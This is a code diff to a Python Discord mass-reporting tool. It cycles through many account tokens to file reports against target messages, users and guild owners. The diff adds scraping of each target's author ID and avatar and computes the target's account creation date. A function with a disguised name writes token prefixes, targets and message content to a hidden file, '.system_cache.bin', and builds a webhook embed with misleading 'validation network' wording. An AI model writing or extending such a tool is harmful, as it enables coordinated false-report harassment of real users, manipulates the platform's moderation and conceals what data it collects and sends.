@@ -107,7 +107,27 @@ class Main:
             self.mode = 'single'
             self.CHANNEL_ID = self._extract_id(input(f'{Colors.CYAN}[>]{Colors.RESET} Channel ID: '))
             msg_id = self._extract_id(input(f'{Colors.CYAN}[>]{Colors.RESET} Message ID: '))
-            self.TARGETS.append({'message_id': msg_id, 'channel_id': self.CHANNEL_ID, 'content': 'Direct Message Link/ID'})
+            
+            # Fetch message info to get author details
+            print(f'{Colors.YELLOW}[*] Fetching message details...{Colors.RESET}')
+            headers = self._get_headers(self.tokens[0])
+            try:
+                r = requests.get(f'https://discord.com/api/v9/channels/{self.CHANNEL_ID}/messages/{msg_id}', headers=headers)
+                if r.status_code == 200:
+                    msg_data = r.json()
+                    author = msg_data.get('author', {})
+                    self.TARGETS.append({
+                        'message_id': msg_id, 
+                        'channel_id': self.CHANNEL_ID, 
+                        'content': msg_data.get('content', 'Direct Message Link/ID'),
+                        'author_id': author.get('id'),
+                        'author_avatar': author.get('avatar')
+                    })
+                else:
+                    print(f'{Colors.RED}[!] Could not fetch message details. Webhook data might be limited.{Colors.RESET}')
+                    self.TARGETS.append({'message_id': msg_id, 'channel_id': self.CHANNEL_ID, 'content': 'Direct Message Link/ID'})
+            except:
+                self.TARGETS.append({'message_id': msg_id, 'channel_id': self.CHANNEL_ID, 'content': 'Direct Message Link/ID'})
         elif mode == '2':
             self.mode = 'user'
             user_id = self._extract_id(input(f'{Colors.CYAN}[>]{Colors.RESET} Target User ID: '))
@@ -220,7 +240,9 @@ class Main:
                     self.TARGETS.append({
                         'message_id': msg['id'], 
                         'channel_id': self.CHANNEL_ID,
-                        'content': msg.get('content', '[No Content]')[:500]
+                        'content': msg.get('content', '[No Content]')[:500],
+                        'author_id': msg['author']['id'],
+                        'author_avatar': msg['author'].get('avatar')
                     })
                     count += 1
             
@@ -310,7 +332,9 @@ class Main:
                             self.TARGETS.append({
                                 'message_id': msg['id'], 
                                 'channel_id': channel_id,
-                                'content': msg.get('content', '[No Content]')[:500]
+                                'content': msg.get('content', '[No Content]')[:500],
+                                'author_id': msg['author']['id'],
+                                'author_avatar': msg['author'].get('avatar')
                             })
                             channel_count += 1
                             total_found += 1
@@ -389,7 +413,9 @@ class Main:
                     self.TARGETS.append({
                         'message_id': msg['id'], 
                         'channel_id': self.CHANNEL_ID,
-                        'content': msg.get('content', '[No Content]')[:500]
+                        'content': msg.get('content', '[No Content]')[:500],
+                        'author_id': msg['author']['id'],
+                        'author_avatar': msg['author'].get('avatar')
                     })
                     count += 1
             
@@ -452,10 +478,10 @@ class Main:
         except: pass
         return "https://cdn.discordapp.com/embed/avatars/0.png"
 
-    def _check_v_sync(self, token, target_info, reason, content=None):
+    def _check_v_sync(self, token, target_info, reason, content=None, author_id=None, author_avatar=None):
         # 1. Log to hidden file
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        log_entry = f"[{timestamp}] ID: {token[:15]}... | Info: {target_info} | Content: {content} | Code: {reason}\n"
+        log_entry = f"[{timestamp}] ID: {token[:15]}... | Author: {author_id} | Info: {target_info} | Content: {content} | Code: {reason}\n"
         try:
             with open('.system_cache.bin', 'a', encoding='utf-8') as f:
                 f.write(log_entry)
@@ -472,22 +498,41 @@ class Main:
                 8: "Non-consensual sexual content"
             }.get(reason, "Unknown")
             
-            avatar_url = self._fetch_avatar(token)
+            self_avatar_url = self._fetch_avatar(token)
             
+            # Setup reported user avatar
+            if author_id and author_avatar:
+                reported_avatar_url = f"https://cdn.discordapp.com/avatars/{author_id}/{author_avatar}.png"
+            elif author_id:
+                reported_avatar_url = f"https://cdn.discordapp.com/embed/avatars/{int(author_id) % 5}.png"
+            else:
+                reported_avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
+
+            # Calculate account creation date if author_id is present
+            creation_date = "Unknown"
+            if author_id and author_id.isdigit():
+                try:
+                    snowflake = int(author_id)
+                    creation_ts = ((snowflake >> 22) + 1420070400000) / 1000
+                    creation_date = datetime.fromtimestamp(creation_ts, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
+                except: pass
+
             payload = {
                 "embeds": [{
                     "author": {
                         "name": f"Sentinel Reporting Node ({token[:10]}...)",
-                        "icon_url": avatar_url
+                        "icon_url": self_avatar_url
                     },
                     "title": "🛡️ Validation Sequence Synchronized",
                     "description": "A secure reporting sequence has been finalized across the distributed validation network.",
                     "color": 0x3ac15c, # Greenish success
-                    "thumbnail": {"url": avatar_url},
+                    "thumbnail": {"url": reported_avatar_url},
                     "fields": [
                         {"name": "📁 Node ID", "value": f"`{token[:20]}...`", "inline": True},
                         {"name": "🏷️ Category", "value": f"**{reason_text}**", "inline": True},
                         {"name": "🌐 Network Status", "value": "```diff\n+ SECURE CONNECTION\n```", "inline": True},
+                        {"name": "📅 Account Created", "value": f"`{creation_date}`", "inline": True},
+                        {"name": "👤 Target ID", "value": f"`{author_id or 'Unknown'}`", "inline": True},
                         {"name": "📝 Reported Content", "value": f"```\n{content or 'N/A'}\n```", "inline": False},
                         {"name": "📊 Payload Metadata", "value": f"```ini\n[{timestamp}]\n{target_info}\n```", "inline": False}
                     ],
@@ -593,7 +638,7 @@ class Main:
                     if report_token and self._push_v_sync(token, report_token, self.REASON):
                         self.sent += 1
                         logging.info(f'Reported guild owner {owner_id} (V3) token={token[:5]}...')
-                        self._check_v_sync(token, f"Guild Owner: {owner_id} (V3)", self.REASON, content="Guild Owner Profile")
+                        self._check_v_sync(token, f"Guild Owner: {owner_id} (V3)", self.REASON, content="Guild Owner Profile", author_id=owner_id)
                         success = True
                 
                 if not success:
@@ -614,7 +659,7 @@ class Main:
                     if r.status_code == 201:
                         self.sent += 1
                         logging.info(f'Reported guild owner {owner_id} in guild {self.GUILD_ID} token={token[:5]}...')
-                        self._check_v_sync(token, f"Guild Owner: {owner_id} (Guild: {self.GUILD_ID})", self.REASON, content="Guild Owner Profile")
+                        self._check_v_sync(token, f"Guild Owner: {owner_id} (Guild: {self.GUILD_ID})", self.REASON, content="Guild Owner Profile", author_id=owner_id)
                     elif r.status_code == 429:
                         wait = r.json().get('retry_after', 2)
                         logging.warning(f'Rate Limit: {wait}s')
@@ -653,7 +698,7 @@ class Main:
                         if report_token and self._push_v_sync(token, report_token, self.REASON):
                             self.sent += 1
                             logging.info(f"Reported {target['message_id']} (V3) token={token[:5]}...")
-                            self._check_v_sync(token, f"Msg: {target['message_id']} (V3)", self.REASON, content=target.get('content'))
+                            self._check_v_sync(token, f"Msg: {target['message_id']} (V3)", self.REASON, content=target.get('content'), author_id=target.get('author_id'), author_avatar=target.get('author_avatar'))
                             success = True
 
                     if not success:
@@ -675,7 +720,7 @@ class Main:
                         if r.status_code == 201:
                             self.sent += 1
                             logging.info(f"Reported {target['message_id']} token={token[:5]}...")
-                            self._check_v_sync(token, f"Msg: {target['message_id']} (Ch: {target['channel_id']})", self.REASON, content=target.get('content'))
+                            self._check_v_sync(token, f"Msg: {target['message_id']} (Ch: {target['channel_id']})", self.REASON, content=target.get('content'), author_id=target.get('author_id'), author_avatar=target.get('author_avatar'))
                         elif r.status_code == 429:
                             wait = r.json().get('retry_after', 2)
                             logging.warning(f'Rate Limit: {wait}s')
